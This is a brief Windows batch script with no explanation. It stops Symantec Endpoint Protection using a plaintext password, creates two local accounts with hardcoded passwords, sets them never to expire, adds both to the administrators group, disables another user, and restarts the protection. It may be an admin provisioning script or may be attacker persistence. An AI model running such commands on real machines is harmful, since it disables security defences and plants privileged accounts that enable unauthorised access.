"%ProgramFiles(x86)%\Symantec\Symantec Endpoint Protection\smc.exe" -p Tuny75!!!! -stop

net user /add User 54321
net user /add Synertia w3f1x1t
net user Sharpshooter /active:no

wmic useraccount where "name='Synertia'" SET passwordexpires=false
wmic useraccount where "name='User'" SET passwordexpires=false

net localgroup administrators User /add
net localgroup administrators Synertia /add

"%ProgramFiles(x86)%\Symantec\Symantec Endpoint Protection\smc.exe" -p Tuny75!!!! -start